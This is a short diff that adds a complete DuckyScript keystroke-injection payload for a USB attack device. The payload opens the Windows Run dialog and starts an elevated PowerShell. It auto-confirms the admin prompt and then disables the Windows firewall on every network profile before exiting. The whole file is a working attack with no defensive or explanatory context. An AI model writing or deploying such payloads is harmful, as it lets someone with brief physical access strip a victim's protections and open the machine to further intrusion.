@@ -1,0 +1,13 @@
+DELAY 2000
+GUI r
+DELAY 200
+STRING powershell Start-Process -FilePath powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 500
+STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+ENTER
+DELAY 500
+STRING exit
+ENTER
